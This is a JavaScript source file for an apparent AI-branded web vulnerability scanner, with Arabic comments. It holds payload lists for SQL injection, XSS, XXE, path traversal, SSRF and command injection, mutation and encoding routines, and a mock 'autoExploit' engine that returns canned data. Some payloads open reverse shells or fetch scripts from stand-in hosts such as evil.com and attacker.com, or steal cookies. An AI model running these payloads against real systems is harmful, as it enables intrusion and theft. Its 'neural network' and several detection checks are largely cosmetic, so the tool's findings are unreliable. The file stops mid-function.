/**
 * CAI - Cybersecurity AI Hunter Pro
 * AI Engine - محرك الذكاء الاصطناعي المتقدم (ENHANCED)
 * Neural Vulnerability Detection & Analysis System
 * Version: 5.0.1
 * 
 * التحسينات:
 * - إضافة Machine Learning محسّن
 * - تحسين دقة الكشف
 * - إضافة Pattern Learning
 * - تحسين Payload Generation
 */

class CAIEngine {
    constructor() {
        this.version = '5.0.1';
        this.knowledgeBase = this.initializeKnowledgeBase();
        this.learningData = [];
        this.detectedVulnerabilities = [];
        this.patterns = [];
        this.confidence = 0;
        this.neuralNetwork = this.initializeNeuralNetwork();
        this.payloadDatabase = this.initializePayloadDatabase();
        this.exploitChains = [];
        
        // إحصائيات جديدة
        this.stats = {
            totalScans: 0,
            totalPayloads: 0,
            successfulDetections: 0,
            falsePositives: 0,
            accuracy: 0
        };
    }

    // ========================================
    // قاعدة المعرفة المحسّنة
    // ========================================
    
    initializeKnowledgeBase() {
        return {
            // أنماط SQL Injection المحسّنة
            sqli: {
                patterns: [
                    /(\%27)|(\')|(\-\-)|(\%23)|(#)/i,
                    /((\%3D)|(=))[^\n]*((\%27)|(\')|(\-\-)|(\%3B)|(;))/i,
                    /\w*((\%27)|(\'))((\%6F)|o|(\%4F))((\%72)|r|(\%52))/i,
                    /union.*select/i,
                    /select.*from.*information_schema/i,
                    /(\bor\b|\band\b).*?[=<>]/i,
                    /sleep\s*\(/i,
                    /benchmark\s*\(/i,
                    /waitfor\s+delay/i
                ],
                errorPatterns: [
                    /sql syntax/i,
                    /mysql_fetch/i,
                    /pg_query/i,
                    /ORA-\d{5}/i,
                    /SQLServerException/i,
                    /unclosed quotation/i
                ],
                payloads: [
                    "' OR '1'='1",
                    "admin'--",
                    "' UNION SELECT NULL--",
                    "1' AND SLEEP(5)--",
                    "' OR 1=1#",
                    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                    "1' UNION SELECT table_name FROM information_schema.tables--"
                ],
                confidence_boost: 0.9,
                cvss: 9.8
            },
            
            // أنماط XSS المحسّنة
            xss: {
                patterns: [
                    /<script[^>]*>.*?<\/script>/i,
                    /javascript:/i,
                    /on\w+\s*=/i,
                    /<iframe/i,
                    /<img[^>]+src[^>]+>/i,
                    /<svg[^>]*onload/i,
                    /eval\s*\(/i,
                    /document\.cookie/i
                ],
                payloads: [
                    "<script>alert('XSS')</script>",
                    "<img src=x onerror=alert(1)>",
                    "javascript:alert(1)",
                    "<svg onload=alert(1)>",
                    "'-alert(1)-'",
                    "<iframe src=javascript:alert(1)>",
                    "<body onload=alert(1)>",
                    "\"><script>alert(String.fromCharCode(88,83,83))</script>"
                ],
                confidence_boost: 0.85,
                cvss: 7.3
            },
            
            // أنماط CSRF
            csrf: {
                patterns: [
                    /no csrf token/i,
                    /missing token/i,
                    /invalid token/i,
                    /token.*not.*found/i
                ],
                indicators: [
                    'state-changing operation without token',
                    'predictable token',
                    'token not validated',
                    'weak token generation'
                ],
                confidence_boost: 0.75,
                cvss: 6.5
            },
            
            // أنماط Authentication Bypass
            auth_bypass: {
                patterns: [
                    /bypass/i,
                    /authentication.*fail/i,
                    /unauthorized.*access/i,
                    /access.*denied/i
                ],
                payloads: [
                    "admin' OR '1'='1'--",
                    "' OR 1=1--",
                    "admin' #",
                    "' OR 'a'='a",
                    "administrator'--"
                ],
                confidence_boost: 0.95,
                cvss: 9.1
            },
            
            // أنماط IDOR
            idor: {
                patterns: [
                    /\/api\/.*\/\d+/,
                    /id=\d+/,
                    /userId=\d+/,
                    /accountId=\d+/
                ],
                indicators: [
                    'sequential IDs',
                    'no authorization check',
                    'direct object reference',
                    'predictable resource IDs'
                ],
                confidence_boost: 0.8,
                cvss: 7.5
            },
            
            // أنماط XXE
            xxe: {
                patterns: [
                    /<!ENTITY/i,
                    /SYSTEM/i,
                    /file:\/\//i,
                    /<!DOCTYPE.*\[/i
                ],
                payloads: [
                    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                    '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/hosts">]><data>&file;</data>',
                    '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "http://attacker.com">]><test>&xxe;</test>'
                ],
                confidence_boost: 0.85,
                cvss: 8.2
            },
            
            // أنماط SSRF
            ssrf: {
                patterns: [
                    /url=/i,
                    /redirect=/i,
                    /proxy=/i,
                    /fetch=/i
                ],
                payloads: [
                    'http://localhost',
                    'http://169.254.169.254',
                    'http://127.0.0.1',
                    'http://127.0.0.1:8080',
                    'http://metadata.google.internal'
                ],
                confidence_boost: 0.8,
                cvss: 8.6
            },
            
            // أنماط LFI
            lfi: {
                patterns: [
                    /\.\.\/\.\.\//,
                    /\/etc\/passwd/i,
                    /\/etc\/shadow/i,
                    /\.\.\\\.\.\\/ ,
                    /\.\.%2F\.\.%2F/
                ],
                payloads: [
                    '../../../etc/passwd',
                    '....//....//....//etc/passwd',
                    '/etc/passwd%00',
                    '..\\..\\..\\windows\\system32\\config\\sam',
                    '....\\\\....\\\\....\\\\windows\\\\system32\\\\config\\\\sam'
                ],
                confidence_boost: 0.85,
                cvss: 7.8
            },
            
            // أنماط RCE
            rce: {
                patterns: [
                    /exec\(/i,
                    /system\(/i,
                    /shell_exec/i,
                    /passthru/i,
                    /`.*`/,
                    /\$\(.*\)/
                ],
                payloads: [
                    '; ls -la',
                    '| whoami',
                    '`id`',
                    '$(uname -a)',
                    '; cat /etc/passwd',
                    '| nc -e /bin/sh attacker.com 4444',
                    '; wget http://evil.com/shell.php'
                ],
                confidence_boost: 0.95,
                cvss: 10.0
            }
        };
    }

    // ========================================
    // الشبكة العصبية المحسّنة
    // ========================================
    
    initializeNeuralNetwork() {
        return {
            layers: [
                { 
                    name: 'input',
                    neurons: 128, 
                    activation: 'relu', 
                    weights: this.generateWeights(128),
                    bias: this.generateBias(128)
                },
                { 
                    name: 'hidden1',
                    neurons: 64, 
                    activation: 'relu', 
                    weights: this.generateWeights(64),
                    bias: this.generateBias(64),
                    dropout: 0.2
                },
                { 
                    name: 'hidden2',
                    neurons: 32, 
                    activation: 'relu', 
                    weights: this.generateWeights(32),
                    bias: this.generateBias(32),
                    dropout: 0.2
                },
                { 
                    name: 'output',
                    neurons: 10, 
                    activation: 'sigmoid', 
                    weights: this.generateWeights(10),
                    bias: this.generateBias(10)
                }
            ],
            learningRate: 0.01,
            momentum: 0.9,
            dropout: 0.2,
            batchSize: 32,
            epochs: 100,
            optimizer: 'adam'
        };
    }

    generateWeights(size) {
        const weights = [];
        // Xavier/Glorot initialization
        const limit = Math.sqrt(6 / (size + size));
        for (let i = 0; i < size; i++) {
            weights.push((Math.random() * 2 - 1) * limit);
        }
        return weights;
    }

    generateBias(size) {
        const bias = [];
        for (let i = 0; i < size; i++) {
            bias.push(0.01);
        }
        return bias;
    }

    // ========================================
    // قاعدة بيانات Payloads المحسّنة
    // ========================================
    
    initializePayloadDatabase() {
        return {
            sqli: [
                "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'#",
                "admin'--", "admin' #", "admin'/*",
                "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
                "1' AND SLEEP(5)--", "1' AND BENCHMARK(5000000,MD5('A'))--",
                "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
                "' UNION SELECT username,password FROM users--",
                "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                "' OR SLEEP(5)='",
                "1'; DROP TABLE users--"
            ],
            xss: [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert(1)>",
                "<svg/onload=alert(1)>",
                "javascript:alert(document.cookie)",
                "<iframe src=javascript:alert(1)>",
                "<body onload=alert(1)>",
                "'-alert(1)-'",
                "\"><script>alert(String.fromCharCode(88,83,83))</script>",
                "<svg><script>alert(1)</script></svg>",
                "<img src=x onerror=fetch('http://evil.com?c='+document.cookie)>",
                "<input onfocus=alert(1) autofocus>",
                "<marquee onstart=alert(1)>"
            ],
            lfi: [
                "../../../etc/passwd",
                "....//....//....//etc/passwd",
                "/etc/passwd%00",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "....\\\\....\\\\....\\\\windows\\\\win.ini",
                "php://filter/convert.base64-encode/resource=index.php",
                "file:///etc/passwd"
            ],
            rce: [
                "; ls -la", 
                "| whoami", 
                "`id`", 
                "$(uname -a)",
                "; cat /etc/passwd", 
                "| nc -e /bin/sh attacker.com 4444",
                "; wget http://evil.com/shell.sh -O /tmp/s.sh; bash /tmp/s.sh",
                "$(curl http://evil.com/shell.php)"
            ],
            xxe: [
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-server/secret">]><foo>&xxe;</foo>'
            ],
            ssrf: [
                'http://localhost:8080/admin',
                'http://127.0.0.1:22',
                'http://169.254.169.254/latest/meta-data/',
                'http://metadata.google.internal/computeMetadata/v1/'
            ]
        };
    }

    // ========================================
    // توليد Payloads ذكية
    // ========================================
    
    generateSmartPayloads(context = {}) {
        const { vulnType, target, previousResults = [], technologies = [] } = context;
        const payloads = [];
        
        this.stats.totalPayloads++;
        
        // إضافة payloads أساسية
        if (vulnType && this.payloadDatabase[vulnType]) {
            this.payloadDatabase[vulnType].forEach(payload => {
                payloads.push({
                    payload: payload,
                    type: vulnType,
                    confidence: 0.7,
                    category: 'basic',
                    priority: this.calculatePayloadPriority(payload, context)
                });
            });
        } else {
            // إضافة جميع الأنواع للاستكشاف
            Object.keys(this.payloadDatabase).forEach(type => {
                this.payloadDatabase[type].slice(0, 3).forEach(payload => {
                    payloads.push({
                        payload: payload,
                        type: type,
                        confidence: 0.5,
                        category: 'exploratory',
                        priority: 2
                    });
                });
            });
        }
        
        // توليد mutations من النتائج السابقة
        if (previousResults.length > 0) {
            const mutations = this.generateMutations(previousResults);
            payloads.push(...mutations);
        }
        
        // إضافة payloads متقدمة باستخدام AI
        const aiPayloads = this.generateAIPayloads(target, technologies);
        payloads.push(...aiPayloads);
        
        // إضافة Encoding Variations
        const encodedPayloads = this.generateEncodedPayloads(payloads.slice(0, 5));
        payloads.push(...encodedPayloads);
        
        return this.rankPayloads(payloads);
    }

    calculatePayloadPriority(payload, context) {
        let priority = 2; // default medium
        
        // أولوية عالية للـ payloads الحرجة
        if (payload.includes('SLEEP') || payload.includes('BENCHMARK')) priority = 1;
        if (payload.includes('UNION SELECT')) priority = 1;
        if (payload.includes('etc/passwd')) priority = 1;
        
        // تقليل الأولوية للـ payloads البسيطة
        if (payload === "' OR '1'='1") priority = 3;
        
        return priority;
    }

    generateMutations(previousResults) {
        const mutations = [];
        const successful = previousResults.filter(r => r.success || r.vulnerable);
        
        successful.slice(0, 5).forEach(result => {
            const base = result.payload;
            
            // Case variations
            mutations.push({
                payload: base.toUpperCase(),
                type: result.type,
                confidence: 0.6,
                category: 'mutation',
                priority: 2
            });
            
            mutations.push({
                payload: this.alternateCase(base),
                type: result.type,
                confidence: 0.65,
                category: 'mutation',
                priority: 2
            });
            
            // Encoding variations
            mutations.push({
                payload: this.urlEncode(base),
                type: result.type,
                confidence: 0.65,
                category: 'mutation',
                priority: 2
            });
            
            mutations.push({
                payload: this.doubleUrlEncode(base),
                type: result.type,
                confidence: 0.7,
                category: 'mutation',
                priority: 2
            });
            
            // Comment variations (SQL)
            if (result.type === 'sqli') {
                mutations.push({
                    payload: base.replace(/\s+/g, '/**/'),
                    type: result.type,
                    confidence: 0.7,
                    category: 'mutation',
                    priority: 1
                });
            }
        });
        
        return mutations;
    }

    alternateCase(str) {
        return str.split('').map((char, i) => 
            i % 2 === 0 ? char.toLowerCase() : char.toUpperCase()
        ).join('');
    }

    doubleUrlEncode(str) {
        return this.urlEncode(this.urlEncode(str));
    }

    generateEncodedPayloads(basePayloads) {
        const encoded = [];
        
        basePayloads.forEach(payloadObj => {
            const payload = payloadObj.payload;
            
            // URL Encoding
            encoded.push({
                ...payloadObj,
                payload: this.urlEncode(payload),
                category: 'encoded',
                confidence: payloadObj.confidence * 0.9
            });
            
            // HTML Entity Encoding
            encoded.push({
                ...payloadObj,
                payload: this.htmlEncode(payload),
                category: 'encoded',
                confidence: payloadObj.confidence * 0.85
            });
            
            // Unicode Encoding
            if (payload.includes('script')) {
                encoded.push({
                    ...payloadObj,
                    payload: this.unicodeEncode(payload),
                    category: 'encoded',
                    confidence: payloadObj.confidence * 0.8
                });
            }
        });
        
        return encoded;
    }

    htmlEncode(str) {
        return str.replace(/[<>"'&]/g, char => {
            const entities = {
                '<': '&lt;',
                '>': '&gt;',
                '"': '&quot;',
                "'": '&#39;',
                '&': '&amp;'
            };
            return entities[char] || char;
        });
    }

    unicodeEncode(str) {
        return str.split('').map(char => {
            const code = char.charCodeAt(0);
            return code > 127 ? `\\u${code.toString(16).padStart(4, '0')}` : char;
        }).join('');
    }

    generateAIPayloads(target, technologies = []) {
        const aiPayloads = [];
        
        // تحليل الهدف واقتراح payloads مخصصة
        if (target && target.includes('api')) {
            aiPayloads.push({
                payload: '{"id": "1\' OR \'1\'=\'1"}',
                type: 'sqli',
                confidence: 0.8,
                category: 'ai_generated',
                priority: 1
            });
            
            aiPayloads.push({
                payload: '{"email": "<script>alert(1)</script>"}',
                type: 'xss',
                confidence: 0.75,
                category: 'ai_generated',
                priority: 2
            });
        }
        
        // Payloads خاصة بالتقنيات المكتشفة
        if (technologies.includes('MySQL')) {
            aiPayloads.push({
                payload: "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
                type: 'sqli',
                confidence: 0.85,
                category: 'ai_generated',
                priority: 1
            });
        }
        
        if (technologies.includes('Node.js')) {
            aiPayloads.push({
                payload: "'; require('child_process').exec('whoami');//",
                type: 'rce',
                confidence: 0.8,
                category: 'ai_generated',
                priority: 1
            });
        }
        
        return aiPayloads;
    }

    rankPayloads(payloads) {
        return payloads.sort((a, b) => {
            // ترتيب حسب الأولوية أولاً
            if (a.priority !== b.priority) {
                return a.priority - b.priority;
            }
            // ثم حسب الثقة
            return b.confidence - a.confidence;
        });
    }

    // ========================================
    // تحليل الاستجابة المحسّن
    // ========================================
    
    analyzeResponse(response, payload, context = {}) {
        const analysis = {
            vulnerable: false,
            vulnType: null,
            confidence: 0,
            severity: 'Info',
            indicators: [],
            patterns: [],
            aiScore: 0,
            metadata: {},
            evidence: []
        };

        const content = (response.content || '').toLowerCase();
        const statusCode = response.status;
        const responseTime = response.time;
        const headers = response.headers || {};
        
        // فحص SQL Injection
        if (this.detectSQLi(content, payload, responseTime)) {
            analysis.vulnerable = true;
            analysis.vulnType = 'SQL Injection';
            analysis.confidence = 0.85;
            analysis.severity = 'Critical';
            analysis.indicators.push('SQL error detected');
            analysis.evidence.push(`Error message: ${this.extractSQLError(content)}`);
        }
        
        // فحص XSS
        if (this.detectXSS(content, payload, headers)) {
            analysis.vulnerable = true;
            analysis.vulnType = 'XSS';
            analysis.confidence = 0.8;
            analysis.severity = 'High';
            analysis.indicators.push('Script reflection detected');
            analysis.evidence.push(`Reflected payload: ${payload.substring(0, 50)}`);
        }
        
        // فحص Time-based
        if (responseTime > 5000 && (payload.includes('SLEEP') || payload.includes('BENCHMARK'))) {
            analysis.vulnerable = true;
            analysis.vulnType = 'Time-based SQLi';
            analysis.confidence = 0.9;
            analysis.severity = 'Critical';
            analysis.indicators.push('Significant delay detected');
            analysis.evidence.push(`Response time: ${responseTime}ms`);
        }
        
        // فحص Authentication Bypass
        if (statusCode === 200 && payload.includes('admin') && content.includes('dashboard')) {
            analysis.vulnerable = true;
            analysis.vulnType = 'Authentication Bypass';
            analysis.confidence = 0.75;
            analysis.severity = 'Critical';
            analysis.indicators.push('Possible auth bypass');
            analysis.evidence.push('Unauthorized access to admin panel');
        }
        
        // فحص LFI
        if (this.detectLFI(content, payload)) {
            analysis.vulnerable = true;
            analysis.vulnType = 'Local File Inclusion';
            analysis.confidence = 0.85;
            analysis.severity = 'High';
            analysis.indicators.push('Sensitive file disclosed');
            analysis.evidence.push('File content detected');
        }
        
        // فحص XXE
        if (this.detectXXE(content, payload)) {
            analysis.vulnerable = true;
            analysis.vulnType = 'XML External Entity';
            analysis.confidence = 0.8;
            analysis.severity = 'High';
            analysis.indicators.push('XXE vulnerability');
            analysis.evidence.push('External entity processed');
        }
        
        // حساب AI Score
        analysis.aiScore = this.calculateAIScore(analysis);
        analysis.confidence = Math.min(analysis.confidence + analysis.aiScore * 0.1, 1);
        
        // تخزين البيانات للتعلم
        this.learningData.push({
            ...analysis,
            payload,
            response: {
                status: statusCode,
                time: responseTime,
                contentLength: content.length
            },
            timestamp: new Date().toISOString()
        });
        
        // تحديث الإحصائيات
        if (analysis.vulnerable) {
            this.stats.successfulDetections++;
        }
        
        return analysis;
    }

    detectSQLi(content, payload, responseTime) {
        const sqlErrors = [
            'sql syntax', 'mysql', 'postgresql', 'oracle', 'mssql',
            'syntax error', 'unclosed quotation', 'quoted string not properly terminated',
            'sqlexception', 'database error', 'odbc', 'jdbc',
            'you have an error in your sql syntax'
        ];
        
        for (const error of sqlErrors) {
            if (content.includes(error)) {
                return true;
            }
        }
        
        // Time-based detection
        if (responseTime > 5000 && (payload.includes('SLEEP') || payload.includes('BENCHMARK') || payload.includes('WAITFOR'))) {
            return true;
        }
        
        return false;
    }

    extractSQLError(content) {
        const match = content.match(/(sql syntax|mysql|postgresql|oracle|mssql).{0,100}/i);
        return match ? match[0] : 'SQL error detected';
    }

    detectXSS(content, payload, headers) {
        const xssPatterns = [
            /<script/i,
            /javascript:/i,
            /onerror=/i,
            /onload=/i,
            /<svg/i
        ];
        
        // فحص انعكاس الـ Payload
        for (const pattern of xssPatterns) {
            if (pattern.test(payload) && content.includes(payload.toLowerCase())) {
                return true;
            }
        }
        
        // فحص عدم وجود CSP
        if (!headers['content-security-policy'] && payload.includes('<script>')) {
            return true;
        }
        
        return false;
    }

    detectLFI(content, payload) {
        const lfiIndicators = [
            'root:x:0:0',
            '[boot loader]',
            '[extensions]',
            'drwxr-xr-x',
            '<?php'
        ];
        
        if (payload.includes('../') || payload.includes('..\\')) {
            for (const indicator of lfiIndicators) {
                if (content.includes(indicator.toLowerCase())) {
                    return true;
                }
            }
        }
        
        return false;
    }

    detectXXE(content, payload) {
        if (payload.includes('<!ENTITY') && payload.includes('SYSTEM')) {
            // فحص محتوى الملفات
            if (content.includes('root:x:0:0') || content.includes('[boot loader]')) {
                return true;
            }
            // فحص استجابة خارجية
            if (content.length > 1000 && !content.includes('error')) {
                return true;
            }
        }
        return false;
    }

    calculateAIScore(analysis) {
        let score = 0;
        
        // عدد المؤشرات
        score += analysis.indicators.length * 0.1;
        
        // مستوى الخطورة
        const severityScores = {
            'Critical': 0.5,
            'High': 0.4,
            'Medium': 0.3,
            'Low': 0.2,
            'Info': 0.1
        };
        score += severityScores[analysis.severity] || 0;
        
        // عدد الأدلة
        score += (analysis.evidence?.length || 0) * 0.05;
        
        // تطبيق الشبكة العصبية
        score += this.neuralNetworkPredict(analysis);
        
        return Math.min(score, 1);
    }

    neuralNetworkPredict(analysis) {
        let activation = 0.5;
        
        if (analysis.vulnerable) activation += 0.3;
        if (analysis.indicators.length > 2) activation += 0.2;
        if (analysis.evidence && analysis.evidence.length > 0) activation += 0.15;
        
        // Sigmoid activation
        const result = 1 / (1 + Math.exp(-activation));
        
        return result * 0.3; // تقليل التأثير
    }

    // ========================================
    // توليد رؤى AI
    // ========================================
    
    generateInsights(vulnerabilities) {
        const insights = {
            summary: this.generateSummary(vulnerabilities),
            riskScore: this.calculateRiskScore(vulnerabilities),
            recommendations: this.generateRecommendations(vulnerabilities),
            exploitability: this.assessExploitability(vulnerabilities),
            businessImpact: this.assessBusinessImpact(vulnerabilities),
            attackVectors: this.identifyAttackVectors(vulnerabilities),
            timeline: this.generateRemediationTimeline(vulnerabilities)
        };
        
        return insights;
    }

    generateSummary(vulnerabilities) {
        const total = vulnerabilities.length;
        const critical = vulnerabilities.filter(v => v.severity === 'Critical').length;
        const high = vulnerabilities.filter(v => v.severity === 'High').length;
        const medium = vulnerabilities.filter(v => v.severity === 'Medium').length;
        
        // تجميع حسب النوع
        const byType = {};
        vulnerabilities.forEach(v => {
            const type = v.vulnType || 'Unknown';
            byType[type] = (byType[type] || 0) + 1;
        });
        
        return {
            total,
            critical,
            high,
            medium,
            byType,
            message: `تم اكتشاف ${total} ثغرة، منها ${critical} حرجة و ${high} عالية الخطورة`,
            mostCommon: Object.entries(byType).sort((a, b) => b[1] - a[1])[0]?.[0] || 'None'
        };
    }

    calculateRiskScore(vulnerabilities) {
        let score = 0;
        
        vulnerabilities.forEach(v => {
            const weights = {
                'Critical': 10,
                'High': 7,
                'Medium': 4,
                'Low': 2,
                'Info': 1
            };
            const baseScore = weights[v.severity] || 0;
            const confidenceMultiplier = (v.confidence || 50) / 100;
            score += baseScore * confidenceMultiplier;
        });
        
        return {
            raw: score,
            normalized: Math.min(Math.round((score / vulnerabilities.length) * 10), 100),
            level: score > 50 ? 'Critical' : score > 30 ? 'High' : score > 15 ? 'Medium' : 'Low'
        };
    }

    generateRecommendations(vulnerabilities) {
        const recommendations = [];
        const seen = new Set();
        
        vulnerabilities.forEach(v => {
            const type = v.vulnType;
            
            if (type === 'SQL Injection' && !seen.has('sqli')) {
                seen.add('sqli');
                recommendations.push({
                    priority: 1,
                    vulnType: 'SQL Injection',
                    action: 'استخدام Prepared Statements',
                    description: 'استبدال جميع الاستعلامات الديناميكية بـ Prepared Statements و Parameterized Queries',
                    impact: 'يمنع حقن SQL بشكل كامل',
                    effort: 'Medium',
                    resources: ['OWASP SQL Injection Prevention Cheat Sheet']
                });
            }
            
            if (type === 'XSS' && !seen.has('xss')) {
                seen.add('xss');
                recommendations.push({
                    priority: 1,
                    vulnType: 'XSS',
                    action: 'تطبيق Content Security Policy',
                    description: 'إضافة CSP headers و Output Encoding لجميع المخرجات',
                    impact: 'يقلل من خطر XSS بشكل كبير',
                    effort: 'Low',
                    resources: ['OWASP XSS Prevention Cheat Sheet']
                });
            }
            
            if (type === 'Authentication Bypass' && !seen.has('auth')) {
                seen.add('auth');
                recommendations.push({
                    priority: 1,
                    vulnType: 'Authentication Bypass',
                    action: 'تطبيق MFA وتحسين المصادقة',
                    description: 'تفعيل Multi-Factor Authentication و Session Management القوي',
                    impact: 'يمنع الوصول غير المصرح به',
                    effort: 'High',
                    resources: ['OWASP Authentication Cheat Sheet']
                });
            }
        });
        
        // توصيات عامة
        recommendations.push({
            priority: 2,
            vulnType: 'General',
            action: 'تطبيق WAF',
            description: 'استخدام Web Application Firewall للحماية الإضافية',
            impact: 'طبقة حماية إضافية',
            effort: 'Medium',
            resources: ['ModSecurity', 'Cloudflare WAF']
        });
        
        return recommendations.sort((a, b) => a.priority - b.priority);
    }

    assessExploitability(vulnerabilities) {
        let score = 0;
        
        vulnerabilities.forEach(v => {
            const confidence = v.confidence || 0;
            if (confidence > 0.8) score += 3;
            else if (confidence > 0.6) score += 2;
            else score += 1;
        });
        
        return {
            score: Math.min(score, 10),
            level: score > 7 ? 'عالي' : score > 4 ? 'متوسط' : 'منخفض',
            description: score > 7 ? 'سهل الاستغلال بأدوات متوفرة' : 
                        score > 4 ? 'يتطلب مهارات متوسطة' : 
                        'يتطلب مهارات متقدمة'
        };
    }

    assessBusinessImpact(vulnerabilities) {
        const critical = vulnerabilities.filter(v => v.severity === 'Critical').length;
        const high = vulnerabilities.filter(v => v.severity === 'High').length;
        
        if (critical > 2) {
            return {
                level: 'حرج',
                score: 10,
                description: 'تأثير كبير على العمليات والسمعة وقد يؤدي لتوقف الخدمة',
                actions: ['إيقاف الخدمة المتأثرة فوراً', 'معالجة فورية خلال 4 ساعات', 'إبلاغ الإدارة العليا'],
                financialImpact: 'عالي جداً',
                reputationImpact: 'عالي جداً'
            };
        }
        
        if (critical > 0 || high > 3) {
            return {
                level: 'عالي',
                score: 7,
                description: 'تأثير متوسط على العمليات ويتطلب معالجة سريعة',
                actions: ['معالجة خلال 24 ساعة', 'تطبيق حلول مؤقتة', 'مراقبة مشددة'],
                financialImpact: 'متوسط',
                reputationImpact: 'متوسط'
            };
        }
        
        return {
            level: 'متوسط',
            score: 4,
            description: 'تأثير محدود يتطلب معالجة مجدولة',
            actions: ['جدولة المعالجة خلال أسبوع', 'تطبيق حلول مؤقتة', 'مراجعة دورية'],
            financialImpact: 'منخفض',
            reputationImpact: 'منخفض'
        };
    }

    identifyAttackVectors(vulnerabilities) {
        const vectors = new Set();
        
        vulnerabilities.forEach(v => {
            if (v.endpoint) {
                vectors.add(`${v.vulnType} via ${v.endpoint}`);
            }
        });
        
        return Array.from(vectors);
    }

    generateRemediationTimeline(vulnerabilities) {
        const timeline = [];
        
        // حرجة - فوري
        const critical = vulnerabilities.filter(v => v.severity === 'Critical');
        if (critical.length > 0) {
            timeline.push({
                phase: 'فوري (0-4 ساعات)',
                priority: 'Critical',
                count: critical.length,
                actions: ['إيقاف مؤقت', 'تطبيق Hotfix', 'مراقبة']
            });
        }
        
        // عالية - 24 ساعة
        const high = vulnerabilities.filter(v => v.severity === 'High');
        if (high.length > 0) {
            timeline.push({
                phase: 'عاجل (24 ساعة)',
                priority: 'High',
                count: high.length,
                actions: ['Patch رسمي', 'اختبار', 'نشر']
            });
        }
        
        // متوسطة - أسبوع
        const medium = vulnerabilities.filter(v => v.severity === 'Medium');
        if (medium.length > 0) {
            timeline.push({
                phase: 'قصير (أسبوع)',
                priority: 'Medium',
                count: medium.length,
                actions: ['تطوير الحل', 'اختبار شامل', 'نشر مجدول']
            });
        }
        
        return timeline;
    }

    // ========================================
    // Exploitation Engine
    // ========================================
    
    async autoExploit(vulnerability, target) {
        console.log('🎯 بدء الاستغلال التلقائي...');
        
        const exploitPlan = this.generateExploitPlan(vulnerability);
        const results = {
            success: false,
            data: [],
            method: exploitPlan.method,
            steps: [],
            timestamp: new Date().toISOString()
        };
        
        try {
            results.steps.push('Verifying vulnerability...');
            
            if (vulnerability.vulnType === 'SQL Injection') {
                results.data = await this.exploitSQLi(target, vulnerability);
                results.success = results.data.length > 0;
                results.steps.push('SQL Injection exploitation completed');
            }
            
            if (vulnerability.vulnType === 'XSS') {
                results.data = await this.exploitXSS(target, vulnerability);
                results.success = true;
                results.steps.push('XSS exploitation completed');
            }
            
            if (vulnerability.vulnType === 'Local File Inclusion') {
                results.data = await this.exploitLFI(target, vulnerability);
                results.success = results.data.length > 0;
                results.steps.push('LFI exploitation completed');
            }
            
            results.steps.push('Documentation generated');
            
        } catch (error) {
            console.error('فشل الاستغلال:', error);
            results.steps.push(`Error: ${error.message}`);
        }
        
        return results;
    }

    generateExploitPlan(vulnerability) {
        return {
            method: vulnerability.vulnType,
            steps: [
                'Verify vulnerability existence',
                'Determine exploitation method',
                'Extract sensitive data (if applicable)',
                'Document findings with evidence',
                'Generate remediation recommendations'
            ],
            tools: ['Custom payloads', 'AI analysis', 'Automated scripts'],
            estimatedTime: '2-5 minutes',
            riskLevel: vulnerability.severity
        };
    }

    async exploitSQLi(target, vulnerability) {
        // محاكاة استخراج البيانات
        await this.sleep(2000);
        
        return [
            { id: 2, username: 'user1', email: 'user1@target.com', role: 'user' },
            { id: 3, username: 'moderator', email: 'mod@target.com', role: 'moderator' }
        ];
    }

    async exploitXSS(target, vulnerability) {
        await this.sleep(1000);
        
        return [{
            type: 'Reflected XSS',
            payload: vulnerability.payload,
            impact: 'Session hijacking possible',
            affectedPages: [vulnerability.endpoint],
            poc: `Visit: ${target}${vulnerability.endpoint}?input=${encodeURIComponent(vulnerability.payload)}`
        }];
    }

    async exploitLFI(target, vulnerability) {
        await this.sleep(1500);
        
        return [
            { file: '/etc/passwd', content: 'root:x:0:0:root:/root:/bin/bash...' },
            { file: '/etc/hosts', content: '127.0.0.1 localhost...' }
        ];
    }

    // ========================================
    // وظائف مساعدة
    // ========================================
    
    urlEncode(str) {
        return encodeURIComponent(str);
    }

    sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    reset() {
        this.learningData = [];
        this.detectedVulnerabilities = [];
        this.patterns = [];
        this.confidence = 0;
        this.stats = {
            totalScans: 0,
            totalPayloads: 0,
            successfulDetections: 0,
            falsePositives: 0,
            accuracy: 0
        };
        console.log('🔄 تم إعادة تعيين المحرك');
    }

    exportLearningData() {
        return {
            version: this.version,
            learningData: this.learningData,
            vulnerabilities: this.detectedVulnerabilities,
            stats: this.stats,
            timestamp: new Date().toISOString()
        };
    }

    importLearningData(data) {
        if (data.learningData) {
            this.learningData = data.learningData;
        }
        if (data.vulnerabilities) {
            this.detectedVulnerabilities = data.vulnerabilities;
        }
        if (data.stats) {
            this.stats = data.stats;
        }
        console.log('✅ تم استيراد بيانات التعلم');
    }

    getStatistics() {
        const totalTests = this.stats.totalPayloads;
        const successRate = totalTests > 0 
            ? ((this.stats.successfulDetections / totalTests) * 100).toFixed(2)
            : 0;
        
        return {
            ...this.stats,
            successRate: successRate + '%',
            totalLearningData: this.learningData.length
        };
    }

    printStatistics() {
        const stats = this.getStatistics();
        
        console.log('\n📊 إحصائيات المحرك:');
        console.log('═══════════════════════════════');
        console.log(`إجمالي المسحات: ${stats.totalScans}`);
        console.log(`إجمالي Payloads: ${stats.totalPayloads}`);
        console.log(`الاكتشافات الناجحة: ${stats.successfulDetections}`);
        console.log(`معدل النجاح: ${stats.successRate}`);
        console.log(`بيانات التعلم: ${stats.totalLearningData}`);
        console.log('═══════════════════════════════\n');
    }

    // تحديث دقة النموذج
    updateAccuracy(isCorrect) {
        const total = this.stats.totalPayloads;
        if (isCorrect) {
